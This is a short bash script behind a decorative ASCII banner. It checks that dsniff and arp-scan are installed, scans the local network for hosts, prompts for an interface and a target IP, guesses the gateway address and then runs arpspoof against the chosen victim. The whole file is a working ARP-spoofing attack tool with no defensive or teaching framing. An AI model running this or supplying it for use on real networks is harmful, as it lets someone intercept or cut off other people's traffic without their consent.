#!/bin/bash

echo -e "\033[1;35m    _______  _______  ______   _______  _        _______  _        _______ _________ _______ "
echo "   (  ___  )(  ____ )(  ___ \ (  ___  )( \      (  ____ \( (    /|(  ____ \\\__   __/(  ___  )"
echo "   | (   ) || (    )|| (   ) )| (   ) || (      | (    \/|  \  ( || (    \/   ) (   | (   ) |"
echo "   | (___) || (____)|| (__/ / | |   | || |      | (__    |   \ | || |         | |   | |   | |"
echo "   |  ___  ||     __)|  __ (  | |   | || |      |  __)   | (\ \) || |         | |   | |   | |"
echo "   | (   ) || (\ (   | (  \ \ | |   | || |      | (      | | \   || |         | |   | |   | |"
echo "   | )   ( || ) \ \__| )___) )| (___) || (____/\| (____/\| )  \  || (____/\___) (___| (___) |"
echo -e "   |/     \||/   \__/|/ \___/ (_______)(_______/(_______/|/    )_)(_______/\_______/(_______)\033[0m"
echo -e "\033[1;31m                      ______        __   _______                                  "
echo "                     |   _  \.-----|  |_|   _   .--.--.----.-----.-----."
echo "                     |.  |   |  -__|   _|.  1   |  |  |   _|  _  |  -__|"
echo "                     |.  |   |_____|____|.  ____|_____|__| |___  |_____|"
echo "                     |:  |   |          |:  |              |_____|"
echo "                     |::.|   |          |::.|"
echo "                     '--- ---'          '---'  v1.1  "
      echo -e "\033[1;32m "
      cat  dibujo.txt
      echo -e " \033[0m"
check_herramienta() {
    if ! [ -x "$(command -v $1)" ]; then
       echo -e "\033[1;31m Error: $1 is not installed. Please install $1 and try again.\033[0m" >&2
       exit 1

    fi
}

check_herramienta "dsniff"
check_herramienta "arp-scan"

echo -e "\033[0;33m"
read -p "Show interface ip: " red
ips=$(arp-scan -I "$red" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')

echo -e "\033[1;33m $ips"
echo -e "\033[1;36m "
read -p "the network you want to analyze: " interfaz
echo -e "\033[1;35m "
read -p "the target's ip:: " ip
puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')

arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"


